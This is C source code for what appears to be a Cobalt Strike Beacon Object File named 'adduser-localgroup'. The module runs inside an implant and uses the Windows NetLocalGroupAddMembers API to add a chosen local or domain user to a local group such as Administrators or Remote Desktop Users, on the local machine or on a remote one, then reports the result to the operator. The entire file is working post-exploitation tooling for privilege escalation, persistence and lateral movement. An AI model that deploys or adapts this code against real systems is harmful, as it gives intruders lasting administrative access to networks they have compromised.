#ifdef _WIN64
// Minimal stub for stack probing if the compiler inserts ___chkstk_ms
__declspec(naked) void ___chkstk_ms(void)
{
    __asm__("ret");
}
#endif

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <lm.h>
#include "beacon.h"

// NetAPI32 function declaration
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(
    LPCWSTR servername,
    LPCWSTR groupname,
    DWORD level,
    LPBYTE buf,
    DWORD totalentries
);

// Error code constants from lmerr.h
#ifndef NERR_Success
#define NERR_Success 0
#endif

#ifndef ERROR_MEMBER_IN_ALIAS
#define ERROR_MEMBER_IN_ALIAS 1378L
#endif

#ifndef NERR_UserNotFound
#define NERR_UserNotFound 2221L
#endif

#ifndef ERROR_NO_SUCH_ALIAS
#define ERROR_NO_SUCH_ALIAS 1376L
#endif

#ifndef NERR_GroupNotFound
#define NERR_GroupNotFound 2220L
#endif

#ifndef ERROR_ACCESS_DENIED
#define ERROR_ACCESS_DENIED 5L
#endif

#ifndef ERROR_INVALID_MEMBER
#define ERROR_INVALID_MEMBER 1388L
#endif


/**
 * Checks if a wide string is empty or represents "local computer".
 *
 * @param str Wide string to check
 * @return TRUE if the string should be treated as NULL (local computer)
 *
 * Treats the following as local computer:
 * - NULL pointer
 * - Empty string
 * - Single dot "."
 */
BOOL IsLocalComputer(const wchar_t *str) {
    if (!str || str[0] == L'\0') {
        return TRUE;
    }
    if (str[0] == L'.' && str[1] == L'\0') {
        return TRUE;
    }
    return FALSE;
}


/**
 * Gets a human-readable error message for common NetAPI error codes.
 *
 * @param errorCode The NET_API_STATUS error code
 * @return Pointer to static error message string
 */
const char* GetNetApiErrorMessage(NET_API_STATUS errorCode) {
    switch (errorCode) {
        case NERR_Success:
            return "Success";
        case ERROR_ACCESS_DENIED:
            return "Access denied. Insufficient privileges to add user to group.";
        case ERROR_MEMBER_IN_ALIAS:
            return "User is already a member of the specified group.";
        case NERR_UserNotFound:
            return "The user account could not be found.";
        case ERROR_NO_SUCH_ALIAS:
        case NERR_GroupNotFound:
            return "The specified local group does not exist.";
        case ERROR_INVALID_MEMBER:
            return "The specified member is invalid or cannot be added to a local group.";
        case ERROR_INVALID_PARAMETER:
            return "Invalid parameter.";
        default:
            return "An unknown error occurred.";
    }
}


/**
 * BOF Entry Point: adduser-localgroup
 *
 * Adds a user (local or domain) to a local group on a computer.
 *
 * Arguments:
 *   @param args Packed argument data from Beacon
 *   @param length Length of packed argument data
 *
 * Expected argument format (all wide strings):
 *   - groupname: Local group name (e.g., "Administrators")
 *   - username: User to add (e.g., "john" or "DOMAIN\john")
 *   - computername: Optional computer name (empty string = local)
 *
 * Uses NetLocalGroupAddMembers API to add the user to the specified
 * local group. Supports both local users and domain users.
 *
 * Example usage:
 *   adduser-localgroup Administrators john
 *   adduser-localgroup Administrators DOMAIN\john
 *   adduser-localgroup "Remote Desktop Users" john \\COMPUTER01
 */
void go(char *args, int length) {
    datap parser;
    BeaconDataParse(&parser, args, length);

    // Extract arguments
    wchar_t *groupName = (wchar_t *)BeaconDataExtract(&parser, NULL);
    wchar_t *userName = (wchar_t *)BeaconDataExtract(&parser, NULL);
    wchar_t *computerName = (wchar_t *)BeaconDataExtract(&parser, NULL);

    // Validate required arguments
    if (!groupName || wcslen(groupName) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error: Group name is required.\n");
        return;
    }

    if (!userName || wcslen(userName) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error: Username is required.\n");
        return;
    }

    // Determine target computer (NULL = local)
    LPCWSTR targetComputer = IsLocalComputer(computerName) ? NULL : computerName;

    // Prepare member info structure
    LOCALGROUP_MEMBERS_INFO_3 memberInfo;
    memberInfo.lgrmi3_domainandname = userName;

    // Display operation info
    if (targetComputer) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Adding user '%ls' to local group '%ls' on computer '%ls'...\n",
                     userName, groupName, targetComputer);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Adding user '%ls' to local group '%ls' on local computer...\n",
                     userName, groupName);
    }

    // Call NetLocalGroupAddMembers
    NET_API_STATUS status = NETAPI32$NetLocalGroupAddMembers(
        targetComputer,
        groupName,
        3,  // Level 3 - LOCALGROUP_MEMBERS_INFO_3
        (LPBYTE)&memberInfo,
        1   // Adding one member
    );

    // Handle result
    if (status == NERR_Success) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Success: User '%ls' added to group '%ls'.\n",
                     userName, groupName);
    } else {
        const char *errorMsg = GetNetApiErrorMessage(status);
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to add user to group.\n");
        BeaconPrintf(CALLBACK_ERROR, "[-] Error: %s (Code: %lu)\n", errorMsg, status);
    }
}
